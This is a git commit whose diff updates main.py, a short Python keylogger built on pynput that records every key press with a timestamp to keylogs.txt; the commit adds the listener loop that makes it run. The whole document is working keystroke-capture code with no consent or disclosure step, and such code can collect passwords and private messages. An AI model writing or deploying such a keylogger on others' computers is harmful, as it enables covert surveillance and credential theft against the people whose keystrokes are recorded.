3d3d581628dda1ed918d5755f1cc3e224c10c440
asimp <85073561+JohnyDope@users.noreply.github.com>
2022-12-13 17:48:12 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,8 +1,13 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+log_dir = ""
+
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
+	level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
     logging.info(str(key))
 
+with Listener(on_press=on_press) as listener:
+    listener.join()
